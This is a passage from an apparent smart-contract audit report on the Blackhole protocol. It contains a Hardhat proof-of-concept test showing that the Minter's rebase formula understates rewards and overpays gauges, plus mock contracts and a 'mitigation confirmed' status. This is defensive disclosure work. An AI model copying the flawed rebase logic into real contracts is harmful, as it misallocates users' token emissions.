class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotal_before = await blackToken.balanceOf(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blackTotal_before = await blackToken.totalSupply(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTBalance_before = await votingEscrow.smNFTBalance(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const superMassiveBonus_before = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance_before);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const weeklyEmission_for_period = await minter.weekly(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Test Case: smNFTBalance is POSITIVE ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;State BEFORE Minter.update_period / calculate_rebase (Revised Inputs):\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  veTotal (tokens in VE for normal/perm locks):\u0026quot;, formatBN(veTotal_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  blackTotal (actual totalSupply after smNFT burn):\u0026quot;, formatBN(blackTotal_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smNFTBalance (sum of original principals burned for smNFTs):\u0026quot;, formatBN(smNFTBalance_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  superMassiveBonus (conceptual bonus on smNFTBalance):\u0026quot;, formatBN(superMassiveBonus_before));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Weekly Mint for this period (emission to be distributed):\u0026quot;, formatBN(weeklyEmission_for_period));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebaseAmount_from_contract_calc = await minter.calculate_rebase(weeklyEmission_for_period);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Rebase Amount calculated BY CONTRACT\u0026#39;S LOGIC:\u0026quot;, formatBN(rebaseAmount_from_contract_calc));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected Logic: circulatingBlack should NOT double-subtract smNFTBalance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const corrected_circulatingBlack = blackTotal_before.sub(veTotal_before); // Numerator: BT - VT\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected Denominator: actual total supply + conceptual bonus\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const corrected_blackSupply_denominator = blackTotal_before.add(superMassiveBonus_before); // Denominator: BT + B\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\nFor Manual/Corrected Calculation:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Corrected Circulating Black (ActualCirculating):\u0026quot;, formatBN(corrected_circulatingBlack));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Corrected Black Supply Denominator (ActualTotalSupply + Bonus):\u0026quot;, formatBN(corrected_blackSupply_denominator));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let corrected_rebaseAmount = ethers.BigNumber.from(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!corrected_blackSupply_denominator.isZero() \u0026amp;\u0026amp; corrected_circulatingBlack.gte(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const num_squared = corrected_circulatingBlack.mul(corrected_circulatingBlack);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const den_squared_times_2 = corrected_blackSupply_denominator.mul(corrected_blackSupply_denominator).mul(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (!den_squared_times_2.isZero()) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                 corrected_rebaseAmount = weeklyEmission_for_period.mul(num_squared).div(den_squared_times_2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Rebase Amount calculated MANUALLY (Corrected Logic):\u0026quot;, formatBN(corrected_rebaseAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const expected_misallocated_rebase = corrected_rebaseAmount.sub(rebaseAmount_from_contract_calc);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Expected Misallocated Rebase (Corrected - Contract):\u0026quot;, formatBN(expected_misallocated_rebase));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // --- Assertions for Vulnerable Outcome ---\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(smNFTBalance_before).to.be.gt(0, \u0026quot;Test setup failed: smNFTBalance should be positive for this test case\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(rebaseAmount_from_contract_calc).to.be.lt(corrected_rebaseAmount, \u0026quot;Contract\u0026#39;s rebase should be less than corrected rebase when smNFTs exist\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(expected_misallocated_rebase).to.be.gt(0, \u0026quot;Expected misallocated rebase amount should be greater than zero\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // --- Demonstrate Upstream Impact on State ---\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rewardsDistributor_bal_before_mint = await blackToken.balanceOf(rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const minterTeamAddress = await minter.team();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_bal_before_mint = await blackToken.balanceOf(minterTeamAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeManager_allowance_before_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Calculate expected team and gauge amounts based on BOTH contract\u0026#39;s flawed rebase AND corrected rebase\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamRate = await minter.teamRate();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MAX_BPS = await minter.MAX_BPS();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamEmission_contract = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeEmission_contract = weeklyEmission_for_period.sub(rebaseAmount_from_contract_calc).sub(teamEmission_contract);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const teamEmission_corrected = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS); // team emission is same\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeEmission_corrected = weeklyEmission_for_period.sub(corrected_rebaseAmount).sub(teamEmission_corrected);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Predicted Distribution (based on contract\u0026#39;s flawed rebase) ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Rebase to Distributor:\u0026quot;, formatBN(rebaseAmount_from_contract_calc));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Team:\u0026quot;, formatBN(teamEmission_contract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Gauges:\u0026quot;, formatBN(gaugeEmission_contract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Predicted Distribution (based on CORRECTED rebase) ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Rebase to Distributor (Corrected):\u0026quot;, formatBN(corrected_rebaseAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Team (Corrected):\u0026quot;, formatBN(teamEmission_corrected));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Predicted Emission to Gauges (Corrected):\u0026quot;, formatBN(gaugeEmission_corrected));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Execute the minting period update\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer).update_period(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rewardsDistributor_bal_after_mint = await blackToken.balanceOf(rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_bal_after_mint = await blackToken.balanceOf(minterTeamAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gaugeManager_allowance_after_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebase_actually_paid = rewardsDistributor_bal_after_mint.sub(rewardsDistributor_bal_before_mint);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const team_actually_paid = team_bal_after_mint.sub(team_bal_before_mint);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const gauge_actually_approved = gaugeManager_allowance_after_mint.sub(gaugeManager_allowance_before_mint); // Assuming allowance starts at 0 or reset\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Actual Distribution After Minter.update_period() ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Rebase Paid to RewardsDistributor:\u0026quot;, formatBN(rebase_actually_paid));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Emission Paid to Team:\u0026quot;, formatBN(team_actually_paid));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Actual Emission Approved for GaugeManager:\u0026quot;, formatBN(gauge_actually_approved));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Assert that actual payments match the contract\u0026#39;s flawed calculations\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(rebase_actually_paid).to.equal(rebaseAmount_from_contract_calc, \u0026quot;Actual rebase paid should match contract\u0026#39;s flawed calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(team_actually_paid).to.equal(teamEmission_contract, \u0026quot;Actual team emission should match contract\u0026#39;s calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(gauge_actually_approved).to.equal(gaugeEmission_contract, \u0026quot;Actual gauge approval should match contract\u0026#39;s calculation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Assert that gauge emission is higher than it should be\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(gauge_actually_approved).to.be.gt(gaugeEmission_corrected, \u0026quot;Gauge emission is higher than it should be due to understated rebase\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const excessToGauges = gauge_actually_approved.sub(gaugeEmission_corrected);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(excessToGauges).to.equal(expected_misallocated_rebase, \u0026quot;Excess to gauges should equal the rebase misallocation\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/GaugeManagerMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Corrected path: go up one level from \u0026#39;mocks\u0026#39; to \u0026#39;contracts\u0026#39;, then into \u0026#39;interfaces\u0026#39;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport { IBlackGovernor } from \u0026quot;../interfaces/IBlackGovernor.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract GaugeManagerMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    uint256 public lastRewardAmount; // Added to observe notified amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function notifyRewardAmount(uint256 amount) external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lastRewardAmount = amount;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function getBlackGovernor() external view returns (address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setBlackGovernor(address _gov) external { // Added for setup convenience\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernor = _gov;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/RewardsDistributorMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract RewardsDistributorMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // event TokenCheckpointed(); // Optional: if you want to verify it\u0026#39;s called\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function checkpoint_token() external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // emit TokenCheckpointed(); // Optional\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003econtracts/mocks/BlackGovernorMock.sol\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Assuming IBlackGovernor.sol is in contracts/interfaces/\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// Corrected path: go up one level from \u0026#39;mocks\u0026#39; to \u0026#39;contracts\u0026#39;, then into \u0026#39;interfaces\u0026#39;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport { IBlackGovernor } from \u0026quot;../interfaces/IBlackGovernor.sol\u0026quot;; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract BlackGovernorMock {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    IBlackGovernor.ProposalState public mockProposalState = IBlackGovernor.ProposalState.Pending;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function status() external view returns (IBlackGovernor.ProposalState) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return mockProposalState;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Helper to change state for testing if needed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function setMockProposalState(IBlackGovernor.ProposalState _newState) external {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        mockProposalState = _newState;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-2\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-50\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-67\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\" style=\"position:relative;\"\u003e\u003ca 